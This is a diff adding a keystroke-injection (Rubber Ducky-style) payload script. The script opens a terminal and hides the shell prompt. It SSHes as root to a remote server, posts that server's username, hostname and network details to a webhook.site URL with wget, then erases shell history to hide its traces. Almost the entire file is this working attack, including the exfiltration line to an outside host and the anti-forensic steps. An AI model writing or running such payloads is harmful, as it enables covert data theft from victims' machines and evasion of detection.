@@ -1,0 +1,13 @@
+REM 1) Connect to an SSH server by public key authorization in the background.
+REM 2) Send a webhook with some server's data, such as IP, Username, Hostname, etc.
+REM 3) Cover all Traces from server and client machines.
+
+DELAY 1000
+CTRL-ALT t
+DELAY 500
+STRING export PS1="\e[40;0;30m";
+ENTER
+STRING nohup ssh root@190.111.222.333 'wget -q --post-data "d=$(whoami;hostname;ip a)" https://webhook.site/ae21cf97-02db-4fab-ab97-9e83820a8dea -O/dev/null;history -d-1;exit;'>/dev/null 2>&1&
+ENTER
+STRING history -d -3--1;exit
+ENTER
